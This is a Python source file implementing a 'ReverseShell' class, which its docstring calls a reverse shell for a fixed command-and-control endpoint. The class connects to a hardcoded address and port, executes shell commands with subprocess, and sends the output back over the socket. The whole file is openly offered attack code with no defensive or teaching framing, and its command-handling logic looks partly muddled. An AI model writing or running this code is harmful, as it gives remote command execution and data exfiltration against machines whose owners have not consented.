import os
import socket
import subprocess

__all__ = ["ReverseShell"]


class ReverseShell:
    """Minimal Linux reverse shell for a fixed C2 endpoint."""

    def __init__(
        self,
        host="192.168.1.10",
        port=5522,
        timeout=1.0,
        command_timeout=10.0,
    ):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.command_timeout = command_timeout
        self.sock = None
        self.last_output = b""
        self._stdin = None
        self._stdout = None

    def connect(self):
        """Establish a TCP connection to the C2 server."""
        if self.sock is not None:
            return self.sock

        try:
            self.sock = socket.create_connection(
                (self.host, self.port),
                timeout=self.timeout,
            )
            self.sock.settimeout(self.timeout)
        except OSError:
            self.sock = None

        return self.sock

    def close(self):
        """Close the C2 connection."""
        if self.sock is not None:
            try:
                self.sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass

            try:
                self.sock.close()
            except OSError:
                pass

        self.sock = None

    def _stdin_stream(self):
        if self._stdin is None or self._stdin.closed:
            self._stdin = os.fdopen(0, "r")
        return self._stdin

    def _stdout_stream(self):
        if self._stdout is None or self._stdout.closed:
            self._stdout = os.fdopen(1, "w")
        return self._stdout

    def _shell(self):
        shell = os.environ.get("SHELL")
        if shell and os.path.exists(shell):
            return shell

        for candidate in ("/bin/bash", "/bin/sh"):
            if os.path.exists(candidate):
                return candidate

        return "/bin/sh"

    def _execute(self, command):
        if not command:
            return b""

        if isinstance(command, bytes):
            command = command.decode("utf-8", "replace")

        shell = self._shell()

        try:
            proc = subprocess.Popen(
                [shell, "-c", command],
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
            )
            out, _ = proc.communicate(timeout=self.command_timeout)
            return out
        except subprocess.TimeoutExpired:
            proc.kill()
            try:
                out, _ = proc.communicate(timeout=1)
            except Exception:
                out = b""
            return out
        except OSError:
            try:
                with os.popen(command) as proc:
                    data = proc.read()
                    return data.encode("utf-8", "replace") if isinstance(data, str) else data
            except Exception:
                return b""

    def send_command(self, command):
        """Send a command to C2 and execute it locally."""
        if command is None:
            self.last_output = b""
            return self.last_output

        if isinstance(command, bytes):
            payload = command
        else:
            payload = str(command).encode("utf-8", "replace")

        if self.sock is not None:
            try:
                self.sock.sendall(payload + b"\n")
            except OSError:
                pass

        self.last_output = self._execute(payload)
        return self.last_output

    def receive_output(self, max_bytes=None):
        """Return buffered output or read available output from C2."""
        if self.last_output:
            data = self.last_output

            if max_bytes is None:
                self.last_output = b""
                return data

            self.last_output = data[max_bytes:]
            return data[:max_bytes]

        if self.sock is not None:
            try:
                chunk = self.sock.recv(4096)
            except OSError:
                chunk = b""

            if chunk:
                if max_bytes is None:
                    return chunk
                return chunk[:max_bytes]

        return b""

    def run(self):
        """Read commands from stdin, execute them, and write output to stdout."""
        self.connect()
        stdin = self._stdin_stream()
        stdout = self._stdout_stream()

        try:
            while True:
                line = stdin.readline()
                if line == "":
                    break

                command = line.strip()
                if not command:
                    continue

                output = self.send_command(command)

                if output:
                    if self.sock is not None:
                        try:
                            self.sock.sendall(output)
                        except OSError:
                            pass

                    stdout.write(output.decode("utf-8", "replace"))
                    stdout.flush()
        finally:
            self.close()

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, exc_type, exc, traceback):
        self.close()
        return False
